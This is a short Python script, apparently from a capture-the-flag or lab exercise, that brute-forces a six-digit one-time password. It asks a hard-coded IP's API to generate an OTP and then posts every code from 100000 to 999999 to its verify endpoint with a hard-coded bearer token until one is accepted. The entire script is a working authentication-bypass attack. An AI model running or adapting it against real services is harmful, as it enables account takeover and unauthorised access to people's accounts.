import requests

data = {
    "code": {
        "code": 0
    }
}

headers = {
    "Content-Type": "application/json",
    "x-requestor": "Ryan",
    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6Im1pY2hhZWxAZ3JlZW5maXN0Lnh5eiIsImlhdCI6MTY3NzgzMzE1OTk5OSwiZXhwIjoxNjc3ODM2NzU2OTk5OX0.8GbQDHbTOau7f5w3mINg9Sdu44JhW1qqRgoROKr8WIE"
}
res = requests.get("http://165.227.147.243:8081/api/generate-otp", headers=headers)
print(res.text)

for i in range(100000,1000000):

    data["code"]["code"] = str(i)

    req = requests.post("http://165.227.147.243:8081/api/verify-otp", headers=headers, json=data)

    if req.status_code == 200:
        print("OTP Code found")
        print(i)
        break
    else:
        print(req.text)